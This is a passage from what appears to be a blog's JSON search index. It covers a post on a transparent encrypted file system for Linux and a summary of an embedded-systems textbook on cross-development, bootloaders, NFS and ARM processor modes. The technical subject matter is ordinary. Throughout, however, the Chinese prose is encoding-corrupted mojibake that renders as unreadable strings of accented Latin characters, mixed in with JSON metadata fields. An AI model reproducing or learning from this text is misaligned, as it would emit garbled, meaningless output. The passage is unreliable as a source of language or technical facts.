å¯†ï¼Œå¯¹äºè¯»æ“ä½œï¼Œåªæœ‰åœ¨æ¥è¿‘é€åˆ°ç”¨æˆ·ç©ºé—´çš„ç¼“å†²åŒºçš„æ—¶å€™æ‰è¿›è¡Œè§£å¯†ï¼ŒåŠ å¯†çš„ä½ç½®è¦è®©æ•°æ®åœ¨Buffer Cacheä¸­æ˜¯ä»¥æ˜æ–‡å½¢å¼å­˜åœ¨çš„ï¼Œä»¥ä¾¿èƒ½å¤Ÿåˆ©ç”¨Linuxçš„ç¼“å†²æœºåˆ¶æé«˜åŠ å¯†æ–‡ä»¶ç³»ç»Ÿçš„æ€§èƒ½ã€‚åä¹‹ï¼Œå‡è®¾æˆ‘ä»¬åœ¨Linux Buffer Cacheå±‚ä»¥ä¸Šè¿›è¡ŒåŠ è§£å¯†æ“ä½œï¼Œè¿™å°±æ„å‘³ç€å¯¹äºåŠ å¯†çš„æ–‡ä»¶ï¼ŒBuffer Cacheä¸­å­˜åœ¨çš„æ˜¯å¯†æ–‡ï¼Œæ¯æ¬¡å†…æ ¸éœ€è¦Buffer Cacheä¸­çš„å†…å®¹çš„æ—¶å€™éƒ½è¦å…ˆè¿›è¡ŒåŠ è§£å¯†çš„å·¥ä½œï¼Œè¿™å°†ä¼šå¤§å¤§çš„é™ä½ç³»ç»Ÿçš„æ€§èƒ½ã€‚\näº¤äº’å¼è„šæœ¬ä¹¦å†™ å¦‚ä½•ä¹¦å†™ä¸æ–‡ä»¶ç³»ç»Ÿè¿è¡Œæ—¶å€™çš„äº¤äº’å¼è„šæœ¬ï¼Œå®ç°åŠ å¯†æ–‡ä»¶ç³»ç»Ÿçš„è‡ªåŠ¨åŒ–æŒ‚è½½è¿‡ç¨‹ã€‚\nQTä¸Shellè„šæœ¬äº¤äº’ å¦‚ä½•å°†QTå›¾å½¢ç•Œé¢è·å–åˆ°çš„å‚æ•°ä¼ é€’ç»™è„šæœ¬ï¼Œå¹¶å¯åŠ¨è„šæœ¬ï¼Œå¦‚ä½•è¿”å›è„šæœ¬çš„æ‰§è¡Œæƒ…å†µç»™å›¾å½¢åŒ–ç•Œé¢ã€‚\n","date":1525698267,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1525698267,"objectID":"fb51403e55cbe9d3171cdcf8d396c747","permalink":"http://www.guozet.me/post/Design-and-Implementation-of-Transparent-Encrypted-File-System-Based-on-Linux/","publishdate":"2018-05-07T13:04:27Z","relpermalink":"/post/Design-and-Implementation-of-Transparent-Encrypted-File-System-Based-on-Linux/","section":"post","summary":"é€‰é¢˜èƒŒæ™¯ ç°åœ¨äººä»¬å¯¹è®¡ç®—æœºç³»ç»Ÿå®‰å…¨é—®é¢˜è€ƒè™‘çš„è¶Šæ¥è¶Šå¤šï¼Œå¯¹è®¡ç®—æœº","tags":"Linux kernel","title":"åŸºäºLinuxé€æ˜åŠ å¯†æ–‡ä»¶ç³»ç»Ÿçš„è®¾è®¡ä¸å®ç°","type":"post"},{"authors":null,"categories":"Linux","content":"ã€ŠåµŒå…¥å¼ç³»ç»Ÿè®¾è®¡ã€‹æ¦‚è¿°\nå‰è¨€ è¿™æ˜¯ã€ŠåµŒå…¥å¼ç³»ç»Ÿè®¾è®¡ã€‹è¿™æœ¬ä¹¦ç±çš„å†…å®¹å°ç»“ï¼Œä¸»è¦ä»‹ç»äº†åµŒå…¥å¼ç³»ç»Ÿæ¶æ„ä¸­çš„ç³»ç»Ÿéƒ¨åˆ†ã€‚\nä¹¦ç±å†…å®¹å°ç»“æ‘˜è¦ åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ä»‹ç»ï¼š\nåµŒå…¥å¼ç³»ç»Ÿè®¾è®¡éƒ¨åˆ†ï¼šARMæ¶æ„éƒ¨åˆ† åµŒå…¥å¼ç³»ç»Ÿè®¾è®¡éƒ¨åˆ† åµŒå…¥å¼ç³»ç»Ÿçš„å®šä¹‰ ä»¥åº”ç”¨ä¸ºä¸­å¿ƒã€ä»¥è®¡ç®—æœºæŠ€æœ¯ä¸ºåŸºç¡€ã€è½¯ç¡¬ä»¶å¯è£å‰ªã€é€‚åº”åº”ç”¨ç³»ç»Ÿå¯¹åŠŸèƒ½ã€å¯é æ€§ã€æˆæœ¬ã€ä½“ç§¯ã€åŠŸè€—ä¸¥æ ¼è¦æ±‚çš„ä¸“ç”¨è®¡ç®—æœºç³»ç»Ÿã€‚â€œåµŒå…¥â€ã€â€œä¸“ç”¨â€ã€â€œè®¡ç®—æœºâ€\nåµŒå…¥å¼ç³»ç»Ÿçš„è½¯ã€ç¡¬ä»¶ç»„æˆï¼Ÿä»¥åŠä¸»è¦ç‰¹ç‚¹ï¼Ÿ è½¯ä»¶ï¼šä»åº•å±‚åˆ°ä¸Šå±‚ï¼šbootloaderç­‰ç³»ç»Ÿåˆå§‹åŒ–å¼•å¯¼ç¨‹åºã€è®¾å¤‡é©±åŠ¨å±‚ï¼ˆåŒ…æ‹¬é©±åŠ¨ç¨‹åºã€æ¿çº§æ”¯æŒåŒ…BSPç­‰ï¼‰ã€æ“ä½œç³»ç»Ÿã€ç”¨æˆ·åº”ç”¨ç¨‹åºã€‚ï¼ˆåº•å±‚ä¸ºä¸Šå±‚æä¾›æœåŠ¡ï¼‰ å¼€å‘è½¯ä»¶ï¼šå³é›†æˆå¼€å‘ç¯å¢ƒï¼ˆasemmbler\u0026amp;\u0026amp;compiler\u0026amp;\u0026amp;linker\u0026amp;\u0026amp;debugger\u0026amp;\u0026amp;loaderï¼‰ ç¡¬ä»¶ç»„æˆï¼šæ ¸å¿ƒæ¿+å¤–å›´æ¿+å¤–è®¾(æ ¸å¿ƒæ¿ï¼šå¾®æ§åˆ¶å™¨ï¼ˆCPUå’Œå¤–è®¾æ¥å£ã€å¤–è®¾æ§åˆ¶å™¨ï¼‰ã€ç”µæºã€æ—¶é’Ÿã€å¤ä½ã€SDRAMã€flashã€‚å¤–å›´æ¿é¢å‘å¤–å›´è®¾å¤‡ï¼Œä¸€èˆ¬æ˜¯å¼•è„šçš„é›†åˆã€ç”µå¹³è½¬æ¢ç”µè·¯ã€‚å¤–å›´è®¾å¤‡ã€‚)ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å°†æ ¸å¿ƒæ¿å’Œå¤–å›´æ¿æ”¾åœ¨ä¸€èµ·ã€‚ ç¡¬ä»¶ç‰¹ç‚¹ï¼šé€šå¸¸ç”±åµŒå…¥å¼å¤„ç†å™¨å’ŒåµŒå…¥å¼å¤–å›´è®¾å¤‡ç»„æˆï¼Œé«˜åº¦é›†æˆï¼Œå¸¸é‡‡ç”¨SOCè®¾è®¡æ–¹æ³•ï¼Œå¯¹åŠŸè€—ã€ä½“ç§¯ç­‰æœ‰ä¸¥æ ¼è¦æ±‚ï¼Œå®šåˆ¶æ€§å†³å®šäº†å®ƒçš„å¯è£å‰ªæ€§ï¼Œæ²¡æœ‰åƒè®¡ç®—æœºé¢†åŸŸçš„å„æ–­ï¼Œè§£å†³æ–¹æ¡ˆä¸å”¯ä¸€ã€‚ è½¯ä»¶ç‰¹ç‚¹ï¼šé‡‡ç”¨äº¤å‰å¼€å‘æ–¹å¼ï¼Œç³»ç»Ÿè½¯ä»¶å±‚æ¬¡åˆ†æ˜ï¼Œæ“ä½œç³»ç»Ÿä¸ºç”¨æˆ·ç¨‹åºæä¾›æ ‡å‡†APIï¼Œæä¾›å›¾å½¢æ¥å£å’Œæ–‡ä»¶ç³»ç»Ÿã€‚ç”¨æˆ·è°ƒç”¨ç³»ç»ŸæœåŠ¡ï¼Œç³»ç»Ÿè°ƒç”¨è®¾å¤‡é©±åŠ¨ä»è€Œæ“çºµç¡¬ä»¶ã€‚ åµŒå…¥å¼ç³»ç»Ÿäº§å“è®¾è®¡çš„åŸºæœ¬æµç¨‹ï¼Ÿ éœ€æ±‚åˆ†æï¼š\nåŠŸèƒ½æ€§éœ€æ±‚æ˜¯ç³»ç»Ÿçš„åŸºæœ¬åŠŸèƒ½ï¼Œå¦‚è¾“å…¥è¾“å‡ºä¿¡å·ã€æ“ä½œæ–¹å¼ç­‰ï¼› éåŠŸèƒ½æ€§éœ€æ±‚åŒ…æ‹¬ç³»ç»Ÿæ€§èƒ½ã€æˆæœ¬ã€åŠŸè€—ã€ä½“ç§¯ã€é‡é‡ç­‰å› ç´ ã€‚ è§„æ ¼è¯´æ˜ï¼šç²¾ç¡®åœ°åæ˜ å®¢æˆ·çš„éœ€æ±‚å¹¶ä¸”ä½œä¸ºè®¾è®¡æ—¶å¿…é¡»æ˜ç¡®éµå¾ªçš„è¦æ±‚ã€‚\nä½“ç³»ç»“æ„è®¾è®¡ï¼šæè¿°ç³»ç»Ÿå¦‚ä½•å®ç°æ‰€è¿°çš„åŠŸèƒ½å’ŒéåŠŸèƒ½éœ€æ±‚ï¼ŒåŒ…æ‹¬å¯¹ç¡¬ä»¶ã€è½¯ä»¶å’Œæ‰§è¡Œè£…ç½®çš„åŠŸèƒ½åˆ’åˆ†ä»¥åŠç³»ç»Ÿçš„è½¯ä»¶ã€ç¡¬ä»¶é€‰å‹ç­‰ã€‚\nè½¯ç¡¬ä»¶è®¾è®¡ï¼šåŸºäºä½“ç³»ç»“æ„ï¼Œå¯¹ç³»ç»Ÿçš„è½¯ä»¶ã€ç¡¬ä»¶è¿›è¡Œè¯¦ç»†è®¾è®¡ã€‚\nç³»ç»Ÿé›†æˆï¼šæŠŠç³»ç»Ÿçš„è½¯ä»¶ã€ç¡¬ä»¶å’Œæ‰§è¡Œè£…ç½®é›†æˆåœ¨ä¸€èµ·ï¼Œè¿›è¡Œè°ƒè¯•ï¼Œå‘ç°å¹¶æ”¹è¿›å•å…ƒè®¾è®¡è¿‡ç¨‹ä¸­çš„é”™è¯¯ã€‚\nç³»ç»Ÿæµ‹è¯•ï¼šå¯¹è®¾è®¡å¥½çš„ç³»ç»Ÿè¿›è¡Œæµ‹è¯•ï¼Œçœ‹å…¶æ˜¯å¦æ»¡è¶³è§„æ ¼è¯´æ˜ä¹¦ä¸­ç»™å®šçš„åŠŸèƒ½è¦æ±‚ã€‚\nå¤„ç†å™¨åŠæ“ä½œç³»ç»Ÿçš„é€‰å‹ä¸»è¦è€ƒè™‘å“ªäº›æ–¹é¢ï¼Ÿ æ“ä½œç³»ç»Ÿæœ¬èº«æ‰€æä¾›çš„å¼€å‘å·¥å…·ã€‚ æ“ä½œç³»ç»Ÿå‘ç¡¬ä»¶æ¥å£ç§»æ¤éš¾åº¦ã€‚ æ“ä½œç³»ç»Ÿçš„å†…å­˜è¦æ±‚ã€‚ å¼€å‘äººå‘˜æ˜¯å¦ç†Ÿæ‚‰æ­¤æ“ä½œç³»ç»ŸåŠå…¶æä¾›çš„ç³»ç»ŸAPIã€‚ æ“ä½œç³»ç»Ÿæ˜¯å¦æä¾›ç¡¬ä»¶çš„é©±åŠ¨ç¨‹åºï¼Œå¦‚ç½‘å¡é©±åŠ¨ç¨‹åºç­‰ã€‚ æ“ä½œç³»ç»Ÿçš„æ˜¯å¦å…·æœ‰å¯å‰ªè£æ€§ã€‚ æ“ä½œç³»ç»Ÿæ˜¯å¦å…·æœ‰å®æ—¶æ€§èƒ½ã€‚ äº¤å‰å¼€å‘ã€äº¤å‰å¼€å‘ç¯å¢ƒï¼Ÿä¸ºä½•éœ€è¦äº¤å‰å¼€å‘ç¯å¢ƒï¼Ÿ äº¤å‰å¼€å‘æ˜¯æŒ‡åœ¨ä¸€å°é€šç”¨è®¡ç®—æœºï¼ˆå®¿ä¸»æœºï¼‰ä¸Šè¿›è¡Œè½¯ä»¶çš„ç¼–è¾‘ç¼–è¯‘ï¼Œç„¶åä¸‹è½½åˆ°åµŒå…¥å¼è®¾å¤‡ï¼ˆç›®æ ‡æœºï¼‰ä¸­è¿è¡Œè°ƒè¯•çš„å¼€å‘æ–¹å¼\näº¤å‰å¼€å‘ç¯å¢ƒä¸€èˆ¬ç”±è¿è¡Œäºå®¿ä¸»æœºä¸Šçš„äº¤å‰å¼€å‘è½¯ä»¶ï¼ˆassembler\u0026amp;\u0026amp;compiler\u0026amp;\u0026amp;linker\u0026amp;\u0026amp;debugger\u0026amp;\u0026amp;loaderï¼‰ã€å®¿ä¸»æœºåˆ°ç›®æ ‡æœºçš„è°ƒè¯•é€šé“ç»„æˆ\néœ€è¦äº¤å‰å¼€å‘ç¯å¢ƒæ˜¯å› ä¸ºç›®æ ‡æœºä¸€èˆ¬å¯¹ä½“ç§¯ã€åŠŸè€—ç­‰æœ‰ä¸¥æ ¼é™åˆ¶ï¼Œèµ„æºä¹Ÿé¢å‘åº”ç”¨ï¼Œè¾ƒä¸ºç´§å¼ ï¼Œè¦æ±‚ä»…ä»…èƒ½æµç•…è¿è¡Œä»£ç å³å¯ï¼Œè€Œå°†ç”¨æˆ·å¼€å‘è½¯ä»¶ï¼ˆåŒ…æ‹¬å„ç§åº“ã€å·¥å…·ï¼‰æ”¾ç½®åœ¨ä¸»æœºä¸Šï¼Œè€Œä¸”ç°åœ¨çš„é›†æˆå¼€å‘ç¯å¢ƒæä¾›äº†å„ç§ä¿®æ”¹å¥½çš„åŠŸèƒ½åº“ï¼Œç”¨èµ·æ¥ä¹Ÿæ–¹ä¾¿ã€‚\nåµŒå…¥å¼é›†æˆå¼€å‘ç¯å¢ƒçš„ä¸»è¦åŠŸèƒ½ï¼Ÿ è¿™æ˜¯ç”±å…¶ç»„æˆå†³å®šçš„ã€‚Assemblerå°†.cæºä»£ç æ±‡ç¼–ï¼Œcompilerå½¢æˆç›®æ ‡æ–‡ä»¶ï¼Œlinkeræ ¹æ®é“¾æ¥æè¿°æ–‡ä»¶å°†å„ä¸ªç›®æ ‡ä»£ç é“¾æ¥å®šä½ç”Ÿæˆå¯æ‰§è¡Œä»£ç ã€‚Debuggeræœ‰äº›äº¤å‰å¼€å‘å·¥å…·æä¾›äº†ä»¿çœŸè°ƒè¯•é€šé“ã€‚Loaderå¯ä»¥å°†ç›®æ ‡æ–‡ä»¶çƒ§å½•è¿›è®¾å¤‡ä¸­ï¼ˆæœ‰æ—¶éœ€è¦å†…éƒ¨å¼•å¯¼ä»£ç çš„é…åˆï¼‰\nåµŒå…¥å¼Linux å¼€å‘ä¸»è¦æµç¨‹ï¼Ÿ æ­å»ºå¼€å‘ç¯å¢ƒâ€“çƒ§å†™bootloaderâ€“çƒ§å†™å†…æ ¸â€“çƒ§å†™æ ¹æ–‡ä»¶ç³»ç»Ÿâ€“çƒ§å†™åº”ç”¨ç¨‹åºã€‚\nå¼€å‘ç¯å¢ƒï¼šREDHATï¼LINUXã€ä¸‹è½½ç›¸åº”çš„GCC äº¤å‰ç¼–è¯‘å™¨è¿›è¡Œå®‰è£…ã€é…ç½®å¼€å‘ä¸»æœºï¼ˆé…ç½®MINICOMå’Œé…ç½®ç½‘ç»œï¼ŒMINICOM è½¯ä»¶çš„ä½œç”¨æ˜¯ä½œä¸ºè°ƒè¯•åµŒå…¥å¼å¼€å‘æ¿ä¿¡æ¯è¾“å‡ºçš„ç›‘è§†å™¨å’Œé”®ç›˜è¾“å…¥çš„å·¥å…·ï¼Œé…ç½®ç½‘ç»œä¸»è¦æ˜¯é…ç½®IPåœ°å€ã€NFSç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œéœ€è¦å…³é—­é˜²ç«å¢™ï¼‰\nçƒ§å†™bootloaderï¼šä¸‹è½½ä¸€äº›å…¬å¼€æºä»£ç çš„BOOTLOADERæ ¹æ®è‡ªå·±å…·ä½“èŠ¯ç‰‡è¿›è¡Œç§»æ¤ä¿®æ”¹ã€‚ æ³¨ï¼šä¸‹è½½æ—¶ï¼Œæœ‰äº›èŠ¯ç‰‡æ²¡æœ‰å†…ç½®å¼•å¯¼è£…è½½ç¨‹åºï¼Œæ¯”å¦‚ä¸‰æ˜Ÿçš„ARM7ã€ARM9ç³»åˆ—èŠ¯ç‰‡ï¼Œè¿™æ ·å°±éœ€è¦ç¼–å†™çƒ§å†™å¼€å‘æ¿ä¸Šflash çš„çƒ§å†™ç¨‹åºã€‚æˆ–è€…ç½‘ç»œä¸Šæœ‰å…è´¹ä¸‹è½½çš„WINDOWS ä¸‹é€šè¿‡JTAG å¹¶å£ç®€æ˜“ä»¿çœŸå™¨çƒ§å†™ARM å¤–å›´flashèŠ¯ç‰‡çš„ç¨‹åºã€‚ä¹Ÿæœ‰LINUX ä¸‹å…¬å¼€æºä»£ç çš„J-FLASH ç¨‹åºã€‚\nä¸‹è½½å†…æ ¸ï¼šå¦‚æœæœ‰ä¸“é—¨é’ˆå¯¹ä½ æ‰€ä½¿ç”¨çš„CPU ç§»æ¤å¥½çš„LINUX æ“ä½œç³»ç»Ÿé‚£æ˜¯å†å¥½ä¸è¿‡ï¼Œä¸‹è½½åå†æ·»åŠ è‡ªå·±çš„ç‰¹å®šç¡¬ä»¶çš„é©±åŠ¨ç¨‹åºï¼Œè¿›è¡Œè°ƒè¯•ä¿®æ”¹ã€‚\nä¸‹è½½æ ¹æ–‡ä»¶ç³»ç»Ÿï¼šä»www.busybox.net ä¸‹è½½ä½¿ç”¨BUSYBOXè½¯ä»¶è¿›è¡ŒåŠŸèƒ½è£å‡ï¼Œäº§ç”Ÿä¸€ä¸ªæœ€åŸºæœ¬çš„æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚æ ¹æ–‡ä»¶ç³»ç»Ÿåœ¨åµŒå…¥å¼ç³»ç»Ÿä¸­ä¸€èˆ¬è®¾ä¸ºåªè¯»ï¼Œéœ€è¦ä½¿ç”¨mkcramfsã€genromfs ç­‰å·¥å…·äº§ç”Ÿçƒ§å†™æ˜ è±¡æ–‡ä»¶ã€‚\næ–‡ä»¶ç³»ç»Ÿå°±æ˜¯æŠŠä½ ç¡¬ç›˜ä¸Šæ•°æ®æŒ‰ç…§ä¸€å®šæ ¼å¼ç»„ç»‡æˆä¸€æ£µæ ‘ã€‚æ•°æ®å—å¯¹åº”åç§°ã€‚åˆ äº†å®ƒå°±ç›¸å½“äºæŠŠç¡¬ç›˜æ ¼å¼åŒ–äº†ã€‚æ ¹æ–‡ä»¶ç³»ç»Ÿå°±æ˜¯å‡ºäº†å†…æ ¸ä»¥å¤–ï¼Œæ‰€æœ‰çš„ç³»ç»Ÿæ–‡ä»¶å­˜å‚¨çš„åœ°æ–¹ã€‚ä¹‹æ‰€ä»¥æˆä¸ºæ ¹ï¼Œæ˜¯å› ä¸ºæœ‰æ ¹æ‰èƒ½æˆç”Ÿé•¿æˆæ ‘ï¼Œæ˜¯å…¶å®ƒæ–‡ä»¶çš„æœ€ç»ˆæŒ‚è½½ç‚¹ã€‚æˆ‘ä»¬è¦æ˜ç™½æ ¹æ–‡ä»¶ç³»ç»Ÿå’Œå†…æ ¸æ˜¯å®Œå…¨ç‹¬ç«‹çš„ä¸¤ä¸ªéƒ¨åˆ†ï¼Œå®ƒæ˜¯å†…æ ¸å¯åŠ¨æ—¶æ‰€mountçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œé‡Œé¢æœ‰å†…æ ¸å¯åŠ¨æ‰€å¿…é¡»çš„æ•°æ®ï¼Œä¸ç„¶å°±é€€å‡ºå¯åŠ¨æ–‡ä»¶ç³»ç»Ÿè¿™ç§æœºåˆ¶æœ‰åˆ©äºç”¨æˆ·å’Œæ“ä½œç³»ç»Ÿçš„äº¤äº’ã€‚æ•°æ®å—å¯¹åº”åç§°ã€‚å°½ç®¡å†…æ ¸æ˜¯Linux çš„æ ¸å¿ƒï¼Œä½†æ–‡ä»¶å´æ˜¯ç”¨æˆ·ä¸æ“ä½œç³»ç»Ÿäº¤äº’æ‰€é‡‡ç”¨çš„ä¸»è¦å·¥å…·ï¼Œå°¤å…¶æ˜¯LINUXã€‚\nä¸‹è½½ç”¨æˆ·ç¨‹åº:å¯ä»¥ä¸‹è½½åˆ°æ ¹æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæœ‰çš„åº”ç”¨ç¨‹åºä¸ä½¿ç”¨æ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œè€Œæ˜¯ç›´æ¥å°†åº”ç”¨ç¨‹åºå’Œå†…æ ¸è®¾è®¡åœ¨ä¸€èµ·ï¼Œè¿™æœ‰ç‚¹ç±»ä¼¼äºUCOS-IIçš„æ–¹å¼ã€‚\nåµŒå…¥å¼Linux å¼€å‘ç¯å¢ƒä¸­é…ç½®NFSæœåŠ¡çš„ç›®çš„ï¼Ÿ å¯ä»¥ä½¿ä¸åŒæœºå™¨ã€ä¸åŒæ“ä½œç³»ç»Ÿä¹‹é—´é€šè¿‡ç½‘ç»œå…±äº«æ–‡ä»¶ï¼Œåƒè®¿é—®æœ¬åœ°æ–‡ä»¶ä¸€æ ·è®¿é—®è¿œç«¯ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ï¼Œåœ¨å¼€å‘é˜¶æ®µï¼Œä¸»æœºåˆ¶ä½œåŸºäºNFSçš„æ–‡ä»¶ç³»ç»Ÿï¼Œåˆ¶å®šå¼€æ”¾ç›®å½•ï¼Œå¼€æ”¾å¯¹è±¡çš„IPèŒƒå›´ï¼Œå°†ç›®å½•æŒ‚è½½åˆ°åµŒå…¥å¼è®¾å¤‡åï¼ŒåµŒå…¥å¼è®¾å¤‡å¯ä»¥æ–¹ä¾¿åœ°è®¿é—®ã€ä¿®æ”¹ä¸»æœºä¸»æœºæ–‡ä»¶ã€‚\nä»€ä¹ˆæ˜¯ç¡¬ä»¶é‡å®šå‘ï¼Ÿ ä¸Šè¯¾çš„è€å¸ˆä¸¾å¾—printfï¼ˆï¼‰æ˜¯ä¸ªå¾ˆå¥½çš„ä¾‹å­ï¼Œé‡å®šå‘ç¨‹åºæ˜¯é¢å‘ç¼–è¯‘ç¯å¢ƒä¸­çš„è¿æ¥å™¨çš„ï¼Œæ˜¯ç”¨æˆ·è‡ªå·±å®šä¹‰çš„Cåº“å‡½æ•°ï¼Œæœ‰äº†å®ƒï¼Œåœ¨ç¨‹åºè¿æ¥æ—¶è¿æ¥å™¨ä¼šè¿æ¥ç”¨æˆ·è‡ªå·±ç¼–å†™çš„Cåº“ä¸­çš„åŠŸèƒ½å‡½æ•°è€Œä¸æ˜¯æ ‡å‡†Cåº“ã€‚ç›¸å½“äºå°†æ ‡å‡†Cåº“è¿›è¡Œäº†ä¸€æ¬¡ç§»æ¤ã€‚ä»ä¸»æœºç¯å¢ƒåˆ°å®é™…è¿è¡Œç¯å¢ƒçš„ç§»æ¤ã€‚\næ¯”å¦‚ï¼šæœ¬æ¥åº“å‡½æ•°fputc()æ˜¯æŠŠå­—ç¬¦è¾“å‡ºåˆ°è°ƒè¯•å™¨æ§åˆ¶çª—å£ä¸­å»çš„,ä½†ç”¨æˆ·æŠŠè¾“å‡ºè®¾å¤‡æ”¹æˆäº†UARTç«¯å£,è¿™æ ·ä¸€æ¥,æ‰€æœ‰åŸºäºfputc()å‡½æ•°çš„printf()ç³»åˆ—å‡½æ•°è¾“å‡ºéƒ½è¢«é‡å®šå‘åˆ°UARTç«¯å£ä¸Šå»äº†ã€‚ç›¸å½“äºå®ç°ç±»ä¼¼çš„åŠŸèƒ½ï¼Œä½†æ˜¯åº•å±‚çš„é©±åŠ¨å˜äº†ã€‚\nARMä½“ç³»ç»“æ„éƒ¨åˆ† ARMç¡¬ä»¶ç”µè·¯æœ€å°ç³»ç»Ÿç»„æˆï¼Ÿ å¾®æ§åˆ¶å™¨ï¼ˆä¾‹å¦‚2410ï¼ŒCPU+å¤–è®¾æ¥å£/å¤–è®¾æ§åˆ¶å™¨ï¼‰ç”µæºã€æ—¶é’Ÿã€å¤ä½ã€å­˜å‚¨å™¨ï¼ˆSDRAM/FLASHï¼ˆNOR8ä½ã€NAND8 16 32ä½ï¼‰ï¼‰ FLASHï¼šå­˜æ”¾æ“ä½œç³»ç»Ÿã€ç”¨æˆ·ç¨‹åºç­‰éœ€è¦æ‰ç”µåä¿å­˜çš„æ•°æ® SDRAMï¼šç³»ç»Ÿè¿è¡Œçš„ä¸»è¦åŒºåŸŸï¼Œç³»ç»ŸåŠç”¨æˆ·æ•°æ®åŠå †æ ˆï¼Œéƒ½åœ¨è¿™ä¸ªåŒºåŸŸã€‚æœ‰æ—¶å¯åŠ¨æ¨¡å¼é€‰æ‹© æœ‰æ—¶éœ€è¦JTAGï¼šå¯¹èŠ¯ç‰‡å†…æ‰€æœ‰éƒ¨ä»¶è¿›è¡Œè®¿é—®ï¼Œé€šè¿‡è¯¥æ¥å£å¯¹ç³»ç»Ÿè°ƒè¯•ã€ç¼–ç¨‹ ARMå¤„ç†å™¨çš„ä¸»è¦å·¥ä½œæ¨¡å¼ï¼Ÿ ARMçš„7ç§å¤„ç†å™¨æ¨¡å¼ï¼ˆä¸åŒçš„æ¨¡å¼ä¸‹æœ‰è‡ªå·±çš„è¡Œä¸ºå‡†åˆ™ï¼‰\nUSRï¼›æ­£å¸¸ç¨‹åºæ‰§è¡Œæ¨¡å¼ FIQï¼›æ”¯æŒé«˜é€Ÿæ•°æ®ä¼ é€å’Œé€šé“å¤„ç† IRQï¼›ç”¨äºé€šç”¨ä¸­æ–­çš„å¤„ç†ã€‚ ç®¡ç†ï¼ˆSVCï¼‰ï¼›æ“ä½œç³»ç»Ÿä¿æŠ¤æ¨¡å¼ ä¸­æ­¢ æœªå®šä¹‰ ç³»ç»Ÿ é™¤äº†USRä¹‹å¤–ï¼Œå…¶å®ƒ6ç§åˆç§°ä¸ºç‰¹æƒæ¨¡å¼ã€‚6ä¸­ç§é™¤äº†ç³»ç»Ÿæ¨¡å¼åˆç§°ä¸ºå¼‚å¸¸æ¨¡å¼ï¼ˆå³å¤„ç†å¼‚å¸¸æ—¶çš„å·¥ä½œæ¨¡å¼ï¼‰ã€‚\nåœ¨è½¯ä»¶æ§åˆ¶ä¸‹å¯ä»¥æ”¹å˜æ¨¡å¼ï¼ˆå³æ”¹å˜CPSRç›¸åº”ï¼‰ï¼Œå¤–éƒ¨ä¸­æ–­æˆ–å¼‚å¸¸å¤„ç†ä¹Ÿå¼•èµ·æ¨¡å¼å˜åŒ–ï¼Œç”¨æˆ·æ¨¡å¼ä¸‹ä¸èƒ½æ”¹å˜æ¨¡å¼ã€‚\næ ¸å¿ƒå¯„å­˜å™¨çš„ä½œç”¨ï¼š R13é€šå¸¸ç”¨ä½œå †æ ˆæŒ‡é’ˆï¼Œç§°ä¸ºSPï¼Œè¢«åˆå§‹åŒ–ä¸ºå¤šä¸ªæ¨¡å¼ä¸‹çš„å †æ ˆã€‚R14ç”¨ä½œå­ç¨‹åºè¿æ¥å¯„å­˜å™¨LRï¼Œä¸­æ–­å¼‚å¸¸æˆ–æ‰§è¡ŒBLæ—¶å¾—åˆ°PCå³R15çš„å¤‡ä»½ã€‚\nCpsrç¨‹åºçŠ¶æ€å¯„å­˜å™¨ï¼Œ32ä½åªç”¨12ä½ï¼Œæ‰€æœ‰æ¨¡å¼ä¸‹å‡å¯è§ã€‚\nSpsrä¿å­˜ç¨‹åºçŠ¶æ€å¯„å­˜å™¨ï¼Œå³å‘ç”Ÿå¼‚å¸¸æ—¶å¯¹CPSRè¿›è¡Œä¿å­˜ï¼Œä¿å­˜å½“å‰çŠ¶æ€ã€‚5ä¸ªå¼‚å¸¸æ¨¡å¼ä¸‹å‡æœ‰å„è‡ªçš„SPSRã€‚\nARMå¤„ç†å™¨çš„å¯åŠ¨è¿‡ç¨‹ï¼Ÿ é¦–å…ˆï¼Œçœ‹ä¸€ä¸‹ï¼ŒARMå¯åŠ¨æ—¶çš„ç¡¬ä»¶æœºåˆ¶ï¼Œä¸Šç”µäº§ç”Ÿå¤ä½å¼‚å¸¸ï¼ŒCPUå¼ºåˆ¶PCä¸º0x00000000ï¼Œæ‰§è¡Œå¤ä½å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œæ¥ä¸‹æ¥å°±ç›¸å½“äºæ‰§è¡Œäº†STRARTUP.Sçš„åŠŸèƒ½ã€‚æ˜¯ç»™ç”¨æˆ·ç¨‹åºæ‰§è¡Œç»™ä»¥åˆé€‚çš„å·¥ä½œç¯å¢ƒï¼Œè®¾ç½®ä¸­æ–­å‘é‡è¡¨ã€å †æ ˆã€æ—¶é’Ÿã€å®Œæˆå†…å­˜æ‹·è´ç­‰ï¼Œç›¸å½“äºSTARTUP.Sæˆ–è€…bootloaderçš„å‰ç«¯ä»£ç ï¼Œæ˜¯å¼€æœºæ‰§è¡Œçš„ç¨‹åºã€‚.æ‹¿2410çš„å¯åŠ¨ä»£ç ä¸¾ä¾‹ï¼Œå®ƒå¯åŠ¨CPUçš„è¿‡ç¨‹æ˜¯ï¼š\nåœ¨èµ·å§‹åœ°å€åˆ†é…ä¸­æ–­å‘é‡è¡¨å³ä¸­æ–­å¤„ç†å‡½æ•°ï¼ˆCPUè¦æ±‚çš„ï¼‰ï¼Œä»¥ä¸ºå‘é‡ç©ºé—´åªæœ‰4å­—èŠ‚ï¼Œæ‰€ä»¥ä¸€èˆ¬åªæ˜¯ä¸€ä¸ªè·³è½¬æŒ‡ä»¤ï¼Œå»åˆ«å¤„æ‰§è¡Œã€‚åœ¨è·³åˆ°å¤ä½å¼‚å¸¸ä¹‹åï¼Œå…³é—­ä¸­æ–­ï¼Œå…³é—­çœ‹é—¨ç‹—ã€‚\nä¹‹ååˆå§‹åŒ–å­˜å‚¨å™¨ç³»ç»Ÿ åˆå§‹å¤šä¸ªæ¨¡å¼ä¸‹çš„å †æ ˆï¼ˆæ¨¡å¼åˆ‡æ¢æ—¶ï¼Œç¡¬ä»¶ç»™SPç½®ä½ï¼‰ 